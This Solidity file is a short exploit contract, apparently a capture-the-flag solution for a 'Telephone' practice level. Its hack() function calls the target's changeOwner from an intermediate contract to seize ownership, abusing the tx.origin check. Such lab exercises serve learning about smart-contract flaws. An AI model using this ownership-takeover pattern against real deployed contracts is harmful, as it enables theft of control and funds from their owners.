// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract HackTelephone {

    address immutable telephoneContractAddr;

    /*
    * @param _telephoneContractAddr Address of the Telephone contract 
    */
    constructor(address _telephoneContractAddr){
        telephoneContractAddr = _telephoneContractAddr;
    }

    /*
    * @dev Invoke this function to get ownership of Telephone contract
    */
    function hack() external {
        Telephone(telephoneContractAddr).changeOwner(msg.sender);
    }
}